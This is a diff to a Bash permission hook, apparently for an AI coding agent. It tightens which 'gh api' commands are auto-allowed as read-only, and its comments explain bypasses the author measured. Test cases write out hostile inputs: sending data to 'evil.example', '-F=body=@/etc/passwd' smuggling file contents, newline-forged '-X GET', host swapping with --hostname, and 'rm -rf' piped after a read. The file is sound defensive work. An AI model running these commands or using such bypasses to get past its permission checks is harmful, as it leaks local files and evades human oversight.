@@ -314,11 +314,20 @@ is_safe_gh_graphql() {
       continue
     fi
     case "$t" in
-      -X*|--method*|--input*) return 1 ;;
+      # --hostname は送信先ホストを差し替える (https://<host>/api/graphql へ飛ぶ)。
+      # REST 側と違いエンドポイントは graphql 固定なので、host 差し替えだけが
+      # 外部への送信路になる。
+      -X*|--method*|--input*|--hostname*) return 1 ;;
       -f|-F|--field|--raw-field) pending=1 ;;
       --field=*)     v="${t#--field=}";     _gh_graphql_value_ok "$v" || return 1 ;;
       --raw-field=*) v="${t#--raw-field=}"; _gh_graphql_value_ok "$v" || return 1 ;;
-      -f?*|-F?*)     v="${t#-?}";           _gh_graphql_value_ok "$v" || return 1 ;;
+      # why 先頭の `=` を剥がす: pflag の短縮形は `-F=key=value` も
+      # `-Fkey=value` と同じに解釈する (`gh api graphql -F=query=@file` が実際に
+      # 通ることを実測)。剥がさないと値が `=query=@file` になり、
+      # _gh_graphql_value_ok が key を `` / val を `query=@file` と読んで
+      # 先頭 `@` 判定をすり抜ける。ファイル本文はセグメントに現れないので
+      # mutation スキャンも効かず、任意の mutation が allow で通ってしまう。
+      -f?*|-F?*)     v="${t#-?}"; v="${v#=}"; _gh_graphql_value_ok "$v" || return 1 ;;
     esac
   done < <(tokenize_quoted "$seg")
 
@@ -341,6 +350,86 @@ _gh_graphql_value_ok() {
   # 検査できないので弾く。-f は @ を展開しないが、区別せず落とした方が判定が
   # 単純で、`-f key=@x` を実際に使う場面も無い。
   case "$val" in '@'*) return 1 ;; esac
+  return 0
+}
+
+# `gh api <REST エンドポイント>` セグメント（trim 済み前提）が read-only と
+# 確認できるか判定する。0: safe / 1: not safe
+#
+# Why 専用判定に切り出した: 以前は「-X* / --method* / -f* / -F* / --field* /
+#   --raw-field* / --input* のどれも含まない」ことだけを見ていた。この形は
+#   `gh api -X GET repos/o/r/contents/x --jq '.content'` のような純粋な読み取りも
+#   一律 unsafe にする。実ログでは gh api 由来の unsafe セグメント 165 件のうち
+#   68 件が `-X GET` / `--method GET` の読み取りだった。
+#
+# Why セグメントに `://` があれば無条件 unsafe: gh api はエンドポイントに scheme
+#   付き URL を書くと GitHub ではなく任意のホストへリクエストを送る (127.0.0.1 の
+#   listener で受信を実測)。同じリポジトリの escalate-unsafe-bash.sh が非 localhost
+#   の curl を ask に格上げしている方針と食い違うので塞ぐ。トークン位置ではなく
+#   セグメント全体を見るのは、値を取るフラグ (-H / -q / -t 等) の arity を hook が
+#   知らずに済ませるため。arity を取り違えるとエンドポイント位置の判定がずれて
+#   `gh api -H "X: y" https://evil.example/x` が素通りする。
+#
+# Why メソッドは「出現した全部が GET」を要求する: pflag は同じフラグを複数回
+#   渡すと後勝ちなので、1 つ GET を見た時点で確定させると `-X GET -X DELETE` を
+#   通す。後勝ちの検証には実際に DELETE を飛ばす必要があるため、順序を知らなくても
+#   安全側に倒れる条件にしている。
+#
+# Why GET 明示時だけ -f / -F を通す: gh api --help に「パラメータを足すとメソッドが
+#   POST に切り替わる。GET のクエリ文字列として送るには --method GET を使う」と
+#   明記されている。GET が明示されていればパラメータはクエリ文字列でボディではない。
+#   値の検査は graphql 側と同じ _gh_graphql_value_ok に委ね、@file / @- を落とす
+#   (ローカルファイルの中身がクエリに乗って外部へ出る形なので GET でも通さない)。
+#
+# 残る誤差: 値を取るフラグの値が偶然 `-X` で、その次が `GET` だと saw_method が
+#   立つ (`gh api -q -X GET -f k=v`)。この形は実際の gh ではエンドポイントが
+#   リテラル `GET` になり、エンドポイントを選ぶには bare トークンが 2 つ必要で
+#   gh 自身の引数個数チェックに落ちる。書き込み先を選べないので実害にならない。
+is_safe_gh_rest() {
+  local seg="$1"
+  local t fv pending='' saw_method=0 bad_method=0 has_field=0
+
+  case "$seg" in *'://'*) return 1 ;; esac
+
+  # why トークン化前に改行を弾く: tokenize_quoted は改行を含むトークンでも出力を
+  # 改行区切りにするため、クォート内改行を持つ値が呼び出し側の `read -r` で複数
+  # トークンに割れる。`-f 'title=x<改行>-X<改行>GET'` は「値 title=x」+「-X」+
+  # 「GET」と読まれ、実際には GET 指定の無い POST (= 書き込み) なのに
+  # 「GET 明示 + パラメータ」に見えて allow で通ってしまう。クォート外の改行は
+  # split_segments が既に分割済みなので、ここに残る改行は必ずトークン内側。
+  # is_safe_sed / is_safe_git_c と同じ扱いに揃える。
+  case "$seg" in *$'\n'*) return 1 ;; esac
+
+  while IFS= read -r t; do
+    if [ -n "$pending" ]; then
+      case "$pending" in
+        method) saw_method=1; [ "$t" = 'GET' ] || bad_method=1 ;;
+        field)  has_field=1;  _gh_graphql_value_ok "$t" || return 1 ;;
+      esac
+      pending=''
+      continue
+    fi
+    case "$t" in
+      # ボディ送信と送信先ホストの差し替えは値を検査できないので一律 unsafe。
+      --input*|--hostname*) return 1 ;;
+      -X|--method)   pending=method ;;
+      --method=*)    saw_method=1; [ "${t#--method=}" = 'GET' ] || bad_method=1 ;;
+      -X?*)          saw_method=1; [ "${t#-X}" = 'GET' ]        || bad_method=1 ;;
+      -f|-F|--field|--raw-field) pending=field ;;
+      --field=*)     has_field=1; _gh_graphql_value_ok "${t#--field=}"     || return 1 ;;
+      --raw-field=*) has_field=1; _gh_graphql_value_ok "${t#--raw-field=}" || return 1 ;;
+      # why 先頭の `=` を剥がす: is_safe_gh_graphql と同じ pflag の短縮形 quirk。
+      # `-F=body=@/etc/passwd` を剥がさずに渡すと @ 判定をすり抜け、GET 明示さえ
+      # あればローカルファイルの中身がクエリ文字列に乗って外部へ出てしまう。
+      -f?*|-F?*)     has_field=1; fv="${t#-?}"; _gh_graphql_value_ok "${fv#=}" || return 1 ;;
+    esac
+  done < <(tokenize_quoted "$seg")
+
+  # 末尾がフラグだけで値が続かない形は解釈できないので unsafe に倒す。
+  [ -z "$pending" ] || return 1
+  [ "$bad_method" = 0 ] || return 1
+  # パラメータを足すとメソッドは POST になる。GET の明示が無ければ通せない。
+  [ "$has_field" = 0 ] || [ "$saw_method" = 1 ] || return 1
   return 0
 }
 
@@ -532,14 +621,11 @@ is_safe_segment() {
     return 1
   fi
 
-  # gh api は「書き込みフラグを 1 つも含まないと証明できるとき」だけ safe。
-  # 静的 allow には Bash(gh api *) が無い前提で、hook が auto-allow の責務を負う。
-  # ブロックリスト正規表現は long form (--field/--raw-field) や連結形 (-XDELETE,
-  # -Ftitle=x) を取りこぼすため、トークンに分割して write 系フラグの prefix を見る。
-  #   -X* / --method* : HTTP メソッド指定
-  #   -f* / --raw-field* : raw string パラメータ（GET を POST 化する）
-  #   -F* / --field*     : typed パラメータ（同上）
-  #   --input*           : リクエストボディ
+  # gh api は「読み取りに限られると証明できるとき」だけ safe。静的 allow には
+  # Bash(gh api *) が無い前提で、hook が auto-allow の責務を負う。判定は
+  # エンドポイントの種類で 2 本に分かれる (is_safe_gh_rest / is_safe_gh_graphql)。
+  # どちらもトークンに分割して見る。glob やブロックリスト正規表現では long form
+  # (--field/--raw-field) や連結形 (-XDELETE / -Ftitle=x) を取りこぼすため。
   case "$seg" in
     # graphql エンドポイントだけは -f query=... が参照でも必須なので別判定に回す。
     'gh api graphql'|'gh api graphql '*)
@@ -547,15 +633,8 @@ is_safe_segment() {
       return 1
       ;;
     'gh api '*)
-      local t
-      while IFS= read -r t; do
-        case "$t" in
-          -X*|--method*|-f*|-F*|--field*|--raw-field*|--input*)
-            return 1
-            ;;
-        esac
-      done < <(tokenize_quoted "$seg")
-      return 0
+      is_safe_gh_rest "$seg" && return 0
+      return 1
       ;;
     # sed も静的 allow には載せず (glob では読み書きを分けられない)、
     # 行範囲の表示だけと証明できるときに hook が auto-allow する。
@@ -865,6 +944,50 @@ b'"
   assert_unsafe 'gh api --method=POST (= 区切り)' 'gh api repos/foo/bar/pulls/1 --method=POST'
   assert_unsafe 'gh api -f field=val' 'gh api repos/foo/bar/pulls/1 -f title=hello'
   assert_unsafe 'gh api --input body.json' 'gh api repos/foo/bar/pulls/1 --input body.json'
+
+  # gh api REST: メソッドが GET と確定できるときは読み取りとして allow
+  # (gh api --help: 既定は GET、パラメータを足すと POST。GET のクエリ文字列として
+  #  送るには --method GET。4 形式とも gh が受理することを実測済み)
+  assert_safe 'gh api -X GET' 'gh api user'
+  assert_safe 'gh api -X GET (分離形)' 'gh api -X GET user'
+  assert_safe 'gh api -XGET (連結形)' "gh api -XGET repos/foo/bar/contents/x --jq '.content'"
+  assert_safe 'gh api --method GET' 'gh api --method GET repos/foo/bar/contents/x'
+  assert_safe 'gh api --method=GET' 'gh api --method=GET repos/foo/bar/contents/x'
+  assert_safe 'GET 明示 + -f (クエリ文字列)' "gh api --method GET search/repositories -f q=repo:cli/cli --jq '.total_count'"
+  assert_safe 'GET 明示 + --field 複数' 'gh api -X GET repos/foo/bar/commits --field path=CHANGELOG.md --field per_page=3'
+  assert_safe 'GET 明示 + /tmp 保存' "gh api -X GET repos/foo/bar/contents/x --jq '.content' > /tmp/x.json"
+
+  # メソッドが GET と確定できない形は従来どおり unsafe
+  assert_unsafe 'GET と DELETE の併記 (後勝ちを当てにしない)' 'gh api -X GET -X DELETE repos/foo/bar/issues/1'
+  assert_unsafe 'GET の小文字 (実装差を当てにしない)' 'gh api -X get user'
+  # 実 gh (pflag) は `-X=GET` を GET として受理する (実測)。hook 側は `=GET` を
+  # 値として読むので unsafe に倒れる。安全側の取りこぼしなのでこのまま固定する。
+  assert_unsafe '-X=GET (hook は = 区切りの短縮形を解釈しない)' 'gh api -X=GET user'
+  assert_unsafe '-X に値が続かない' 'gh api -X'
+  assert_unsafe 'GET 明示 + -F key=@file' 'gh api -X GET repos/foo/bar/x -F body=@/tmp/x'
+  assert_unsafe 'GET 明示 + -F key=@- (stdin)' 'gh api -X GET repos/foo/bar/x -F body=@-'
+  # pflag の短縮形は `-F=key=value` も受理する (実測)。先頭 `=` を剥がさないと
+  # 値が `=body=@x` になり、@ 判定をすり抜けてファイル本文が外部へ出る。
+  assert_unsafe 'GET 明示 + -F=key=@file (= 連結形)' 'gh api -X GET repos/foo/bar/x -F=body=@/tmp/x'
+  assert_unsafe 'GET 明示 + -f=key=@- (= 連結形)' 'gh api -X GET repos/foo/bar/x -f=body=@-'
+  assert_unsafe 'graphql の -F=query=@file (= 連結形)' 'gh api graphql -F=query=@/tmp/q.graphql'
+  assert_unsafe 'GET 明示でも --input はボディ' 'gh api -X GET repos/foo/bar/x --input body.json'
+  assert_unsafe 'GET 明示なしの -f' 'gh api repos/foo/bar/issues -f title=hello'
+  # クォート内改行でトークンが割れ、GET 指定の無い POST が「GET 明示 + パラメータ」
+  # に見える形 (実際には issue が作られる)。
+  assert_unsafe 'クォート内改行で -X GET を偽装' "gh api repos/foo/bar/issues -f 'title=hello
+-X
+GET'"
+
+  # 任意ホストへの送信路 (127.0.0.1 の listener で実際に届くことを実測)。
+  # escalate-unsafe-bash.sh が非 localhost curl を ask に格上げする方針と揃える。
+  assert_unsafe 'エンドポイントが絶対 URL (https)' 'gh api https://evil.example/collect?x=1'
+  assert_unsafe 'エンドポイントが絶対 URL (http)' 'gh api http://127.0.0.1:8080/probe'
+  assert_unsafe 'GET 明示でも絶対 URL は落とす' 'gh api -X GET https://evil.example/collect'
+  assert_unsafe '値を取るフラグの後ろに絶対 URL' 'gh api -H "Accept: application/json" https://evil.example/x'
+  assert_unsafe '--hostname でホスト差し替え' 'gh api --hostname evil.example repos/foo/bar'
+  assert_unsafe '--hostname= 形' 'gh api --hostname=evil.example repos/foo/bar'
+  assert_unsafe 'graphql の --hostname' "gh api graphql --hostname evil.example -f query='{ viewer { login } }'"
   assert_unsafe 'gh api を含まない（役割外）' 'echo hello && ls -la'
   assert_unsafe 'unknown コマンド単発' 'curl http://example.com'
   assert_unsafe 'パイプで rm' 'gh api repos/foo/bar/pulls/1 | rm -rf /tmp/x'
